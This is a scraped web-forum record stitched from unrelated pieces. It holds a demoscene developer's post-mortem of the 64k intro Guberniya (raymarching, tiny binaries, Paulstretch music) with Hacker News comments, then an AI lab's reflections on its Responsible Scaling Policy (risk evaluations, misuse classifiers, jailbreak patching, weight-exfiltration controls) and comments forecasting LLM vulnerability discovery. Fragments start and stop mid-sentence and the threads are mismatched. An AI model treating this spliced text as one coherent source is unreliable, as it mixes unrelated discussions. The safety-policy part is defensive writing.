so use spaces everywhere > [as long as mechanically enforcable, the choice itself is irrelevant] It's not mechanically enforceable (in practice), that's the point.

    "originLink": "https://www.lofibucket.com/articles/64k_intro.html",

Some demos are really small, say 64 kilobytes or less, and these are called intros. The name comes from “crack intros”. So an intro is just a demo that’s small. I’ve noticed many people have interest in demoscene productions but have no idea how they are actually made. This is a braindump/post-mortem of our recent 64k intro Guberniya and I hope that it will be interesting to newcomers and seasoned veterans alike. This article touches basically all techniques used in the demo and should give you an idea what goes into making one. I refer to people with their nick names in this article because that’s what sceners do. Guberniya in a nutshell Windows binary download: guberniya_final.zip (61.8 kB) (somewhat broken on AMD cards) It’s a 64k intro released at Revision 2017 demo party. Some numbers: C++ and OpenGL, dear imgui for GUI 62976 byte Windows executable, packed with kkrunchy mostly raymarching 6 person team one artist :) built in four months ~8300 lines of C++, library code and whitespace excluded 4840 lines of GLSL shaders ~350 git commits Development Demos are usually released at a demo party where the audience watches demos submitted to a competition and then votes for the winner. Releasing at a party is a great way to get motivated since you have a hard deadline and an eager audience. In our case it was Revision 2017, a big traditional demo party during the Easter weekend. You can view some photos to get an idea what the event is like. The number of commits per week. That big spike is us hacking away right before the deadline. The last two bars are commits for the final version released after the party. We started working on the demo early in January and released it on the Easter weekend in April during the party. You can watch a recording of the whole competition online if you wish :) We were a team of six: cce (me), varko, noby, branch, msqrt, and goatman. Design & influences The song was done pretty early on, so I tried to design things around it. It was clear we needed something big and cinematic with memorable set pieces. My original visual ideas centered around wires and their usage. I really liked Viktor Antonov’s designs and my first sketches were pretty much a rip-off of Half-Life 2: Early sketches of citadel towers and ambitious human characters. Full size. Viktor Antonov’s concept art in Half-Life 2: Raising the Bar. The similarities are quite obvious. In the landscape scenes I was also trying to capture the mood of Eldion Passageway by Anthony Scimes. The landscape was inspired by this nice video of Iceland and also Koyaanisqatsi, I guess. I also had big plans for the story that manifested itself as a storyboard: The storyboard differs from the final intro. For example the brutalist architecture was dropped. The full storyboard. If I’d do this again I’d just settle with a timeline with a couple of photos that set the mood. It’s less work and leaves more room for imagination. But at least drawing it forced me to organize my thoughts. The Ship The spaceship was designed by noby. It is a combination of multiple Mandelbox fractals intersected with geometric primitives. The ship’s design was left a bit incomplete, but we felt it shouldn’t be further tampered with in the final version. The spaceship is a raymarched distance field, just like everything else. We had also another ship shader that didn’t get used. Now that I look at the design it’s also very cool and it’s a shame it didn’t find use in the intro. A space ship design by branch. Full size Implementation We started with a codebase built for our earlier intro Pheromone (YouTube). It had basic windowing and OpenGL boilerplate along with file system utility that packed files from a data directory to executable with bin2h. The workflow We used Visual Studio 2013 to compile the project since it wouldn’t compile on VS2015. Our standard library replacement didn’t work well with the updated compiler and produced amusing errors like this: Visual Studio 2015 didn’t play well with our codebase. For some reason we stuck with VS2015 as an editor though and just compiled the project using the v120 platform toolkit. I made most of my work with the demo like this: shaders open in one window and the end result with console output in others. Full size. We had a simple global keyboard hook that reloaded all shaders when CTRL+S key combination was detected: // Listen to CTRL+S. if (GetAsyncKeyState(VK_CONTROL) && GetAsyncKeyState('S')) { // Wait for a while to let the file system finish the file write. if (system_get_millis() - last_load > 200) { Sleep(100); reloadShaders(); } last_load = system_get_millis(); } This worked really well and made live editing shaders much more fun. No need to have file system hooks or anything. GNU Rocket For animation and direction we used a GNU Rocket fork Ground Control. Rocket is a program for editing animation curves and it connects to the demo via a TCP socket. The keyframes are sent over when requested by the demo. It’s very convenient because you can edit and recompile the demo while keeping the editor open without losing the sync position. For the final release the keyframes are exported to a binary format. It has some annoying limitations though. The Tool Moving the viewpoint with mouse and keyboard is very handy for picking camera angles. Even a simple GUI helps a lot when tweaking values. We didn’t have a demotool unlike some people so we had to build it as we went a long. The excellent dear imgui library allowed us to easily add features as we needed them. For example adding some sliders to control some bloom parameters is as simple as adding these lines inside the rendering loop (not to separate GUI code): imgui::Begin(\"Postprocessing\"); imgui::SliderFloat(\"Bloom blur\", &postproc_bloom_blur_steps, 1, 5); imgui::SliderFloat(\"Luminance\", &postproc_luminance, 0.0, 1.0, \"%.3f\", 1.0); imgui::SliderFloat(\"Threshold\", &postproc_threshold, 0.0, 1.0, \"%.3f\", 3.0); imgui::End(); The end result: These sliders were easy to add. The camera position can be saved by pressing F6 to a .cpp file, so the next time the code is compiled it will be included. This avoids the need for a separate data format and the related serialization code, but this solution can also get pretty messy. Making small binaries The key to small executables is scrapping the default standard library and compressing the compiled binary. We used Mike_V’s Tiny C Runtime Library as a base for our own library implementation. The binaries are compressed with kkrunchy, which is a tool made for exactly this purpose. It operates on standalone executables so you can write your demo in C++, Rust, Object Pascal or whatever. To be honest, size wasn’t really a problem for us. We didn’t store much binary data like images so we had plenty of room to play with. We didn’t even remove comments from shaders! Floating points Floating point code caused some headaches by producing calls to nonexistent standard library functions. Most of these were eliminated by disabling SSE vectorization with the /arch:IA32 compiler switch and removing calls to ftol with the /QIfst flag that generates code that doesn’t save the FPU truncation mode flags. This is not a problem because you can set the floating point truncation mode at the start of your program with this snippet courtesy of Peter Schoffhauzer: // set rounding mode to truncate // from http://www.musicdsp.org/showone.php?id=246 static short control_word; static short control_word2; inline void SetFloatingPointRoundingToTruncate() { __asm { fstcw control_word // store fpu control word mov dx, word ptr [control_word] or dx, 0x0C00 // rounding: truncate mov control_word2, dx fldcw control_word2 // load modfied control word } } You can read more about these things at benshoof.org. POW Calling pow still generated a call to __CIpow intrinsic function that didn’t exist. I couldn’t figure out its signature on my own but I found an implementation in Wine’s ntdll.dll that revealed that it expects two double precision floats in registers. Now it was possible to make a wrapper that calls our own pow implementation: double __cdecl _CIpow(void) { // Load the values from registers to local variables. double b, p; __asm { fstp qword ptr p fstp qword ptr b } // Implementation: http://www.mindspring.com/~pfilandr/C/fs_math/fs_math.c return fs_pow(b, p); } If you know a nicer way to fix this, please let me know. WinAPI When you can’t depend on SDL or similar you need to use plain WinAPI to do the necessary plumbing to get a window on screen. If you are suffering through this, these might prove helpful: WinAPI window creation example OpenGL initialization example, requires glext.h and wglext.h Note that we only load the function pointers for OpenGL functions that are actually used in the production in the latter example. It might be a good idea to automate this. The functions need to be queried with string identifiers that get stored in the executable, so loading as few functions as possible saves space. Whole Program Optimization might eliminate all unreferenced string literals but we couldn’t use it because of a problem with memcpy. Rendering techniques Rendering is mostly raymarching and we used the hg_sdf library for convenience. Íñigo Quílez (from now on called just iq) has written lots about this and many of the techniques. If you’ve ever visited ShaderToy you should be familiar with this already. Additionally, we had the raymarcher output a depth buffer value so we could intersect signed distance fields with rasterized geometry and also apply post-processing effects. Shading We use standard Unreal Engine 4 shading (here’s a big pdf that explains it) with a GGX lobe. It isn’t very visible but makes a difference in highlights. Early on our plan was to have an unified lighting pipeline for both raymarched and rasterized shapes. The idea was to use deferred rendering and shadow maps, but this didn’t work at all. An early experiment with shadow mapping. Note how both the towers and the wires cast a shadow on the raymarched terrain and also intersect correctly. Full size. Rendering huge terrains with shadow maps is super hard to get right because of the wildly varying screen-to-shadow-map-texel ratio and other accuracy problems. I wasn’t really in the mood to start experimenting with cascaded shadow maps either. Also, raymarching the same scene from multiple points of view is slow. So we just decided to scrap the whole unified lighting thing. This proved to be a huge pain later when were trying to match the lighting of the rasterized wires and raymarched scene geometry. Terrain The terrain is raymarched value noise with analytic derivatives.1 The generated derivates are used for shading of course, but also to control ray stepping length to accelerate ray traversal on smooth regions, just like in iq’s examples. If you want to learn more you you can read more about this technique in this old article of his or play around with his awesome rainforest scene on ShaderToy. The landscape heightmap became much more realistic after msqrt implemented exponentially distributed noise. Early tests of my own value noise terrain implementation. A terrain implemented by branch that wasn’t used. I can’t remember why. Full size. The landscape effect is very slow because we do brute force shadows and reflections. The shadows use a soft shadow hack in which the penumbra size is determined by the closest distance encountered during shadow ray traversal. They look pretty nice in action. We also tried using bisection tracing to speed it up but it produced too many artifacts to be useful. Mercury’s (another demogroup) raymarching tricks on the other hand helped us to eke out some extra quality with the same speed. Landscape rendering with fixed point iteration enhancement (left) and with regular raymarching (right). Note the nasty ripple artifacts in the picture on the right. The sky is built using pretty much the same techniques as described by iq in behind elevated, slide 43. Just some simple functions of the ray direction vector. The sun outputs pretty large values to the framebuffer (>100) so it adds some natural bloom as well. The alley scene This is a view that was inspired by Fan Ho’s photography. Our post-processing effects really make it come together even though the underlying geometry is pretty simple. An ugly distance field with some repeated blocks. Full size. Add some exponential distance fog. Full size. The wires make the scene more interesting and lifelike. Full size. In the final version some noise was added to the distance field to give an impression of brickwalls. Full size. A color gradient, bloom, chromatic aberration and lens flares are added in post-processing. Full size. Modelling with distance fields The B-52 bombers are a good example of modelling with signed distance fields. They were much simpler in the party version, but we spiced ’em up for the final. They look pretty convincing from afar: The bombers look OK at a distance. Full size. However they are just a bunch of capsules. Admittedly it would’ve been easier to just to make them in some 3D package but we didn’t have any kind of mesh packing pipeline set up so this was faster. Just for reference, this is how the distance field shader looks like: bomber_sdf.glsl They are actually very simple, though. Full size. The characters The first four frames of the goat animation. The animated characters are just packed 1-bit bitmaps. During playback the frames are crossfaded from one to the next. They were contributed by a mysterious goatman. A goatherd with his friends. Post-processing The post-processing effects were written by varko. The pipeline is: Apply shading from G-buffer Calculate depth-of-field Extract bright parts for bloom Perform N separable Gaussian blurs Calculate fake lens flares & wide headlight flares Composite all together Smooth edges with FXAA (thanks mudlord!) Color correction Gamma correction and subtle film grain The lens flares follow pretty much the technique described by John Chapman. They were sometimes hard to work with but in the end still delivered. We tried to use the depth of field effect with good taste. Full size. The depth of field effect (based on DICE’s technique) is made of three passes. The first one calculates the size of circle of confusion for each pixel and the two other passes apply two rotated box blurs each. We also do iterative refinement (i.e. apply multiple Gaussian blurs) when needed. This implementation worked really well for us and was fun to play with. The depth of field effect in action. The red picture shows the calculated circle of confusion for the DOF blur. Color correction There is an animated parameter pp_index in Rocket that is used to switch between color correction profiles. Each profile is just a different branch in a big switch statement in the final post-processing pass shader: vec3 cl = getFinalColor(); if (u_GradeId == 1) { cl.gb *= UV.y * 0.7; cl = pow(cl, vec3(1.1)); } else if (u_GradeId == 2) { cl.gb *= UV.y * 0.6; cl.g = 0.0+0.6*smoothstep(-0.05,0.9,cl.g*2.0); cl = 0.005+pow(cl, vec3(1.2))*1.5; } /* etc.. */ It’s very simple but worked well enough. Physics simulation There are two simulated systems in the demo: the wires and a flock. They were also written by varko. The wires Wires add more life to the scenes. Full size. The wires are considered a series of springs. They are simulated on the GPU using compute shaders. We run multiple small steps of the simulation due to the instability of the Verlet integration method we use. The compute shader also outputs the wire geometry (a series of triangular prisms) to a vertex buffer. Sadly, the simulation doesn’t work on AMD cards for some reason. A flock of birds The birds give a sense of scale. The flock simulation consists of 512 birds with the first 128 considered the leaders. The leaders move in a curl noise pattern and the others follow. I think in real life birds consider the movement of their closest neighbours, but this simplification looks good enough. The flock is rendered as GL_POINTs whose size is modulated to give appearance of flapping wings. This rendering technique was also used in Half-Life 2, I think. Music The traditional way to make music for a 64k intro is to have a VST-instrument plugin that allows a musicians to use their regular tools to compose the music. Farbrausch’s V2 synthesizer is a classic example of this approach. This was a problem. I didn’t want to use any ready made synthesizer but I also knew from earlier failed experiments that making my own virtual instrument would be a lot work. I remember really liking the mood of element/gesture 61%, a demo by branch with a paulstretched ambient song. It got me thinking about implementing it in a 4k or 64k size. Paulstretch Paulstretch is a wonderful algorithm for really crazy time stretching. If you haven’t heard about it, you should definitely listen what it can make out of Windows 98’s startup sound. Its inner workings are described in this interview with the author, and it’s also open source. Original audio (top) and stretched audio (bottom) done with Audacity’s Paulstretch effect. Note how the frequencies also get smeared across the spectrum (y-axis). Basically, as it stretches the input it also scrambles its phases in frequency space so that instead of metallic artifacts you get ethereal echoes. This requires of course a Fourier transform and the original application uses the Kiss FFT library for this. I didn’t want to depend on an external library so in the end I implemented a naive O(N2) Discrete Fourier Transform on the GPU. This took a long time to get right but in the end it was worth it. The GLSL shader implementation is very compact and runs pretty fast despite its brute-force nature. A tracker module Now it was possible to make swathes of ambient drone, given some reasonable input audio to stretch. So I decided to use some tried and tested technology: tracker music. It’s pretty much like MIDI2 but with also samples packed in the file. For example elitegroup’s kasparov (YouTube) uses a module with additional reverb added. If it worked 17 years ago, why not now? I used Windows’ built-in gm.dls MIDI soundbank file (again, a classic trick) to make a song with MilkyTracker in XM module format. This is the format that was used also for many MS-DOS demoscene productions back in the 90s. I used MilkyTracker to compose the original song. The instrument sample data is stripped off the final module file and replaced with offsets and lengths in gm.dls. The catch with gm.dls is that the instruments, courtesy of Roland in 1996, sound very dated and cheesy. Turns out this is not a problem if you bathe them in tons of reverb! Here’s an example where a short test song is played first and a stretched version follows: Surprisingly atmospheric, right? So yeah, I made a song imitating Hollywood songwriting and it turned out great. That’s pretty much all that’s going on the music side. Thanks Thanks to varko for help in some technical details of this article.

    "commentBody": "How a 64k intro is made (2017) (lofibucket.com)146 points by aragonite 6 hours agohidepastfavorite29 comments tomxor 4 hours agoI've toyed with doing writeups of some of my demos, but one aspect I've struggled with is how the explanation of how it works is often severely departed from the process of creating it. The writeup here appears to be fairly natural, and maybe this is the true process for something as large as 64k, but I mostly do 192 byte demos, the largest I've ever done is 512 and 1024 byte. I think there is a difference at this size where the size very much takes charge of the creative process - and that can be quite interesting because you end up doing a lot of experimentation and accidentation and discover things you wouldn't normally be pushed to and can pivot the entire demo. However when deconstructing the result in order to explain it, this juts gets lost and I've struggled to figure out how to convey this duality. To only post a \"how it works\" would omit the part where all magic happens, yet that's hard to explain on it's own, and hard to combine with the \"how it works\". reply indigochill 2 hours agoparentAlthough a different context, I always find the writeups of cybersecurity CTFs that go through the \"What I was thinking, what surprises I encountered, how I pivoted\" process both more enjoyable and more enlightening than writeups that simply explain the solution as if it was known from the beginning. At the same time there might be some editing since there might have been approaches tried that didn't go anywhere, and whether that's interesting/relevant to the reader is probably a judgement call from someone who knows the domain and whether those dead ends might have been natural things to try in that specific context. reply divbzero 46 minutes agoparentprev> the explanation of how it works is often severely departed from the process of creating it This description rings true for a whole swath of creative endeavors, including ones like demos that appear technical on the surface: optimizing an algorithm, conducting scientific research, building an engine, constructing a mathematical proof, and so on. reply mysterydip 3 hours agoparentprevMaybe a \"why it works\" post would be useful, as in \"this part of the demo does x because I was trying to do y but ran into this issue, which caused me to experiment with z and then a side effect inspired me to switch abc to def\", etc. Personally I think explaining the creative process is more interesting than explaining the end result. reply tomxor 2 hours agorootparent> Personally I think explaining the creative process is more interesting than explaining the end result. Thanks, I think this is right, to focus on the process instead (and commenters indigochill and lawn) which I think are describing the same type of writeup. Perhaps my error was starting with \"how it works\", whereas I probably should focus on the story of the process and add the \"how it works\" where it makes sense in the story. I also don't really try to record the process at the moment, it's just from memory. reply lawn 3 hours agoparentprevI know nothing about the subject but an idea is to use a \"let's make a demo\" story to, as you say, capture the important journey instead of the end result. It takes more effort than a simple \"how it works\" explanation but if done correctly I think it should explain how the demo works while also capturing the magic of the creation process. reply kaoD 3 hours agoparentprevHow long does it take you to make a demo? Might be cool to do a live streaming, or just record the process even if not live. reply tomxor 2 hours agorootparentSometimes I do it in one sitting, sometimes that's quite long, like 12 hours or more! Other times I will revisit it over days or months - You'd be surprised how much thought and transformation can go into 192 characters. It depends how much potential room for improvement it \"feels\" like there is left, you get a sense for it, sometimes you just know it's done, others you're never quite sure when to stop trying to push harder. I've commented in a sibling my experience live streaming which was interesting. Another Demoscener who has given this far more concerted effort on Twitch is KilledByAPixel, I think they are recorded somewhere maybe on youtube. My two attempts are lost to time. As an example (yes shameless plug) I wrote this one recently over a couple of long evenings, I'd estimate 8 hours maybe: https://www.dwitter.net/d/31805 (runs fastest in Firefox) But there are some familiar micro-raymarching techniques I've already developed and reused in this. The bit that took most of the time in this one was figuring out how to fit binary search marching that was required to support large differences in marching distances and textures without producing excessive moire effects. reply theeandthy 4 hours agoparentprevThis is the same for any creative process. Any painter could describe how they’re reasoning about a composition and what-not. But ultimately each individual needs to digest technique and make it their own.

But as a format I found it didn't really work well because for my most impressive demos 90% of the time I'm just staring intensely at tiny fragments of code and trying to rearrange and run it in my brain - this is not interesting to watch believe me, I suppose one could condense the video to only show the ends of those segments and just talk out-loud about the concrete thought that has coalesced at the end of it and the actions that are now being taken. reply codetrotter 1 hour agorootparent> I suppose one could condense the video to only show the ends of those segments and just talk out-loud about the concrete thought that has coalesced at the end of it and the actions that are now being taken.

The amount of work required to do a high quality 64k is so huge that, especially now that the demoscene is not as big as it used to be, a lot of people don't think it warrants the time investment anymore. (Btw, the best way to prove me wrong is to write a 64k intro about it) reply laurentlb 52 minutes agoparentIt's also worth noting that the expectations around 64k got higher. We can do so much more in 64k than it was possible in the past. Compression tools have improved. If you take the famous fr-08 intro from Farbrausch and recompress it with modern packers, you would get back many kilobytes. So I think the time investment needed to make a top 64k has increased. The source code of all my 64k intros has been shared (the last one was added two weeks ago): https://github.com/ctrl-alt-test/demo-archive/ and my plan is to share more code to help people get started.

The demoscene does try to keep that spirit going on modern platforms with artificial constraints like \"Windows exe limited to 64kb\" but I think it's harder for someone coming in fresh to appreciate the appeal of that handicap.

    "originBody": "Policy Reflections on our Responsible Scaling Policy May 20, 2024●14 min read Last summer we published our first Responsible Scaling Policy (RSP), which focuses on addressing catastrophic safety failures and misuse of frontier models. In adopting this policy, our primary goal is to help turn high-level safety concepts into practical guidelines for fast-moving technical organizations and demonstrate their viability as possible standards. As we operationalize the policy, we expect to learn a great deal and plan to share our findings. This post shares reflections from implementing the policy so far. We are also working on an updated RSP and will share this soon. We have found having a clearly-articulated policy on catastrophic risks extremely valuable. It has provided a structured framework to clarify our organizational priorities and frame discussions around project timelines, headcount, threat models, and tradeoffs. The process of implementing the policy has also surfaced a range of important questions, projects, and dependencies that might otherwise have taken longer to identify or gone undiscussed. Balancing the desire for strong commitments with the reality that we are still seeking the right answers is challenging. In some cases, the original policy is ambiguous and needs clarification. In cases where there are open research questions or uncertainties, setting overly-specific requirements is unlikely to stand the test of time. That said, as industry actors face increasing commercial pressures we hope to move from voluntary commitments to established best practices and then well-crafted regulations. As we continue to iterate on and improve the original policy, we are actively exploring ways to incorporate practices from existing risk management and operational safety domains. While none of these domains alone will be perfectly analogous, we expect to find valuable insights from nuclear security, biosecurity, systems safety, autonomous vehicles, aerospace, and cybersecurity. We are building an interdisciplinary team to help us integrate the most relevant and valuable practices from each. Our current framework for doing so is summarized below, as a set of five high-level commitments. Establishing Red Line Capabilities. We commit to identifying and publishing \"Red Line Capabilities\" which might emerge in future generations of models and would present too much risk if stored or deployed under our current safety and security practices (referred to as the ASL-2 Standard). Testing for Red Line Capabilities (Frontier Risk Evaluations). We commit to demonstrating that the Red Line Capabilities are not present in models, or - if we cannot do so - taking action as if they are (more below). This involves collaborating with domain experts to design a range of \"Frontier Risk Evaluations\" – empirical tests which, if failed, would give strong evidence against a model being at or near a red line capability. We also commit to maintaining a clear evaluation process and a summary of our current evaluations publicly. Responding to Red Line Capabilities. We commit to develop and implement a new standard for safety and security sufficient to handle models that have the Red Line Capabilities. This set of measures is referred to as the ASL-3 Standard. We commit not only to define the risk mitigations comprising this standard, but also detail and follow an assurance process to validate the standard’s effectiveness. Finally, we commit to pause training or deployment if necessary to ensure that models with Red Line Capabilities are only trained, stored and deployed when we are able to apply the ASL-3 standard. Iteratively extending this policy. Before we proceed with activities which require the ASL-3 standard, we commit to publish a clear description of its upper bound of suitability: a new set of Red Line Capabilities for which we must build Frontier Risk Evaluations, and which would require a higher standard of safety and security (ASL-4) before proceeding with training and deployment. This includes maintaining a clear evaluation process and summary of our evaluations publicly. Assurance Mechanisms. We commit to ensuring this policy is executed as intended, by implementing Assurance Mechanisms. These should ensure that our evaluation process is stress-tested; our safety and security mitigations are validated publicly or by disinterested experts; our Board of Directors and Long-Term Benefit Trust have sufficient oversight over the policy implementation to identify any areas of non-compliance; and that the policy itself is updated via an appropriate process. Threat Modeling and Evaluations Our Frontier Red Team and Alignment Science teams have focused on threat modeling and engaging with domain experts. They are primarily focused on (a) improving threat models to determine which capabilities would warrant the ASL-3 standard of security and safety, (b) working with teams developing ASL-3 controls to ensure that those controls are tailored to the correct risks, and (c) mapping capabilities which the ASL-3 standard would be insufficient to handle, and which we would continue to test for even once it is implemented. Some key reflections are: Each new generation of models has emergent capabilities, making anticipating properties of future models unusually challenging. There is a serious need for further threat modeling. There is reasonable disagreement amongst experts over which risks to prioritize and how new capabilities might cause harm, even in relatively established Chemical, Biological, Radiological, and Nuclear (CBRN) domains. Talking to a wide variety of experts in different sub-domains has been valuable, given the lack of consensus view. Attempting to make threat models quantitative has been helpful for deciding which capabilities and scenarios to prioritize. Our Frontier Red Team, Alignment Science, Finetuning, and Alignment Stress Testing teams are focused on building evaluations and improving our overall methodology. Currently, we conduct pre-deployment testing in the domains of cybersecurity, CBRN, and Model Autonomy for frontier models which have reached 4x the compute of our most recently tested model (you can read a more detailed description of our most recent set of evaluations on Claude 3 Opus here). We also test models mid-training if they reach this threshold, and re-test our most capable model every 3 months to account for finetuning improvements. Teams are also focused on building evaluations in a number of new domains to monitor for capabilities for which the ASL-3 standard will still be unsuitable, and identifying ways to make the overall testing process more robust. Some key reflections are: Fast iteration cycles with domain experts are especially valuable for recognizing when the difficulty level of a test is poorly calibrated or the task is divorced from the threat model in question. We should increasingly aim to leverage and encourage the growing ecosystem of researchers and firms in this space. Many of the risks we aim to assess, particularly those involving autonomy or misalignment, are inherently complex and speculative, and our own testing and threat modeling is likely incomplete. It will also be valuable to develop a mature external ecosystem that can adequately assess the quality of our claims, as well as offer accessible evals as a service to less well-resourced companies. We have begun to test partnerships with external organizations in these areas. Different evaluation methodologies have their own strengths and weaknesses, and the methods that most compellingly assess a model's capabilities will differ depending on the threat model or domain in question. Question & answer datasets are relatively easy to design and run quickly. However, they may not be the most reflective of real-world risk due to their inherently constrained formats. Teams will continue to explore the possibility of designing datasets that are good proxies for more complex sets of tasks, and which could trigger a more comprehensive, time-intensive set of testing. Human trials comparing the performance of subjects with model access to that of subjects with search engines are valuable for measuring misuse-related domains. However, they are time-intensive, requiring robust, well-documented, and reproducible processes. We have found it especially important to focus on establishing good expert baselines, ensuring sufficient trial sizes, and performing careful statistical inference in order to get meaningful signals from trials. We are exploring ways to scale up our infrastructure to run these types of tests. Automated task evaluations have proven informative for threat models where models take actions autonomously. However, building realistic virtual environments is one of the more engineering-intensive styles of evaluation. Such tasks also require secure infrastructure and safe handling of model interactions, including manual human review of tool use when the task involves the open internet, blocking potentially harmful outputs, and isolating vulnerable machines to reduce scope. These considerations make scaling the tasks challenging. Although less rigorous and reproducible than the approaches described above, expert red-teaming and reviewing model behavior via transcripts have also proven valuable. These methods allow for more open-ended exploration of model capabilities and make it easier to seek expert opinions on the relevance of different evaluation tasks or questions. There are a number of open research questions on which our teams will focus over the coming months to build a reliable evaluation process. We welcome more exploration in these areas from the broader research community. We aim to collect evidence about model risk and prepare suitable mitigations before reaching dangerous thresholds. This requires extrapolating from current evidence to future risk levels. Ideally, the “scaling laws” that lead to dangerous capabilities would be smooth, making it possible to predict when models might develop dangerous capabilities. In future, we hope to be able to predict precisely how much more capable a next-generation model will be in a given domain. Techniques can be used to help models complete tasks more effectively, including domain-specific reinforcement learning training, prompt engineering, and supervised fine-tuning. This makes it impossible to guarantee we are eliciting all the relevant model capabilities during testing. A good testing process involves a concerted effort to pass evaluations and invest in capability elicitation improvements. This is important to simulate scenarios where well-resourced malicious actors bypass security controls and gain access to model weights. However, there is no clear distinction between trying extremely hard to elicit a dangerous capability in some model and simply training a model to have that capability. We hope to make more precise and principled claims about what sufficient elicitation would look like in future versions of the policy. There is significant value in making our risk assessment process externally legible. We have therefore aimed to pre-specify test results we think are indicative of an intolerable level of risk when left unmitigated. These clear commitments help avoid production pressures incentivizing the relaxation of standards, although they may inevitably result in somewhat crude or arbitrary thresholds. We would like to explore ways to better aggregate the different sources of evidence described above while maintaining external legibility for verifiable commitments. Similarly, we may explore whether to incorporate other sources of evidence, such as forecasting, which are common in other domains. The ASL-3 Standard Our Security, Alignment Science, and Trust and Safety teams have been focused on developing the ASL-3 standard. Their goal is to design and implement a set of controls that will sufficiently mitigate the risk of the model weights being stolen by non-state actors or models being misused via our product surfaces. This standard would be sufficient for many models with capabilities where even a low rate of misuse could be catastrophic. However, it would not be sufficient to handle capabilities which would enable state groups or groups with substantial state backing and resources. Some key reflections are: Our current plans for ensuring models are used safely and responsibly in all of our product surfaces (e.g. Vertex, Bedrock, Claude.ai) involve scaling up research on classifier models for automated detection and response as well as strengthening all aspects of traditional trust and safety practices. For human misuse, we expect a defense-in-depth approach to be most promising. This will involve using a combination of reinforcement learning from human feedback (RLHF) and Constitutional AI, systems of classifiers detecting misuse at multiple stages in user interactions (e.g. user prompts, model completions, and at the conversation level), and incident response and patching for jailbreaks. Developing a practical end-to-end system will also require balancing cost, user experience, and robustness, drawing inspiration from existing trust and safety architectures. As described in the Responsible Scaling Policy, we will red-team this end-to-end system prior to deployment to ensure robustness against sophisticated attacks. We emphasize the importance of tying risk mitigation efforts directly to threat models, and have found that these risk mitigation objectives are improved via close collaboration between the teams developing our red-teaming approach and the researchers leading our threat modeling and evaluations efforts. Scaling up our security program and developing a comprehensive roadmap to defend against a wide variety of non-state actors has required a surge of effort: around 8% of all Anthropic employees are now working on security-adjacent areas and we expect that proportion to grow further as models become more economically valuable to attackers. The threat models and security targets articulated in the RSP have been especially valuable for our security team to help prioritize and motivate the necessary changes. Implementing the level of security required by the ASL-3 standard will require changing every aspect of employees' day-to-day workflows. To make these changes in a thoughtful way, our security team has invested significant time in building partnerships with teams, especially researchers, to preserve productivity and apply state-of-the-art cyber security controls to tooling. Our threat modeling assumes that insider device compromise is our highest risk vector. Given this, one of our main areas of focus has been implementing multi-party authorization, time-bounded access controls in order to reduce the risk of model weights exfiltration. Under this system, employees are granted temporary access and only via the smallest set of necessary permissions. Fortunately, Anthropic has already adopted a culture of peer review across software engineering, research, comms, and finance teams, and so adopting multi-party controls as we approach the ASL-3 level has been a well-received extension of these existing cultural norms. In such a fast-moving field, it is often difficult to define risk mitigations, or even the methods we will use to assess their effectiveness, upfront. We want to make binding commitments where possible while still allowing degrees of freedom when new information and situations arise. We expect it will be most practical, for both the ASL-3 standard and future standards, to provide a high-level sketch of expected mitigations and set clear “attestation” standards they must meet before use. For example, with our security standard, we can clarify the goal of defending against non-state actors without specifying detailed controls in advance, and pair this with a sensible attestation process involving detailed control lists, review from disinterested experts, and board approval. Assurance Structures Lastly, our Responsible Scaling, Alignment Stress Testing, and Compliance teams have been focused on exploring possible governance, coordination, and assurance structures. We intend to introduce more independent checks over time and are looking to hire a Risk Manager to develop these structures, drawing on best practices from other industries and relevant research. Some key reflections are: The complexity and cross-functional nature of the workstreams described above requires a high level of central coordination. We will continue to build a Responsible Scaling Team to manage the complex web of work streams and dependencies. Amidst a range of competing priorities, strong executive backing has also been essential in reinforcing that identifying and mitigating risks from frontier models is a company priority, deserving significant resources. There is value in creating a “second line of defense” – teams that can take a more adversarial approach to our core work streams. Our Alignment Stress Testing team has begun to stress-test our evaluations, interventions, and overall policy execution. For example, the team provided reflections on potential under-elicitation alongside our Claude 3 Opus evaluations report, which were shared with our Board of Directors and summarized in our report to the U.S. Department of Commerce Bureau of Industry and Security. It may make sense to build out a bespoke internal audit function over time. In addition to providing regular updates to our Board of Directors and the Long-Term Benefit Trust, we have shared evaluations reports and quarterly updates on progress towards future mitigations to all employees. Encouraging employees to feel ownership over the RSP and share areas they would like to see us improve the policy has been immensely helpful, with staff drawing on diverse backgrounds to provide valuable insights. We also recently implemented a non-compliance reporting policy that allows employees to anonymously report concerns to our Responsible Scaling Officer about our implementation of our RSP. Ensuring future generations of frontier models are trained and deployed responsibly will require serious investment from both Anthropic and others across industry and governments. Our Responsible Scaling Policy has been a powerful rallying point with many teams' objectives over the past months connecting directly back to the major workstreams above. The progress we have made on operationalizing safety during this period has necessitated significant engagement from teams across Anthropic, and there is much more work to be done. Our goal in sharing these reflections ahead of the upcoming AI Seoul Summit is to continue the discussion on creating thoughtful, empirically-grounded frameworks for managing risks from frontier models. We are eager to see more companies adopt their own frameworks and share their own experiences, leading to the development of shared best practices and informing future efforts by governments.",

For example, their first bullet point was: > Establishing Red Line Capabilities. We commit to identifying and publishing \"Red Line Capabilities\" which might emerge in future generations of models and would present too much risk if stored or deployed under our current safety and security practices (referred to as the ASL-2 Standard). What types of things are they thinking about that would be \"red line capabilities\" here? Is it purely just \"knowledge stuff that shouldn't be that easy to find\", e.g. \"simple meth recipes\" or \"make a really big bomb\", or is it something deeper? For example, I've already seen AI demos where, with just a couple short audio samples, speech generation can pretty convincingly sound like the person who recorded the samples. Obviously there is huge potential for misuse of that, but given the knowledge is already \"out there\", is this something that would be considered a red line capability? reply jasondclinton 14 hours agoparentHi, I'm the CISO from Anthropic. Thank you for the criticism, any feedback is a gift. We have laid out in our RSP what we consider the next milestone of significant harms that we're are testing for (what we call ASL-3): https://anthropic.com/responsible-scaling-policy (PDF); this includes bioweapons assessment and cybersecurity. As someone thinking night and day about security, I think the next major area of concern is going to be offensive (and defensive!) exploitation. It seems to me that within 6-18 months, LLMs will be able to iteratively walk through most open source code and identify vulnerabilities. It will be computationally expensive, though: that level of reasoning requires a large amount of scratch space and attention heads. But it seems very likely, based on everything that I'm seeing. Maybe 85% odds. There's already the first sparks of this happening published publicly here: https://security.googleblog.com/2023/08/ai-powered-fuzzing-b... just using traditional LLM-augmented fuzzers. (They've since published an update on this work in December.) I know of a few other groups doing significant amounts of investment in this specific area, to try to run faster on the defensive side than any malign nation state might be. Please check out the RSP, we are very explicit about what harms we consider ASL-3. Drug making and \"stuff on the internet\" is not at all in our threat model. ASL-3 seems somewhat likely within the next 6-9 months. Maybe 50% odds, by my guess. reply philipwhiuk 16 minutes agorootparentThe net of your \"Responsible Scaling Policy\" seems to 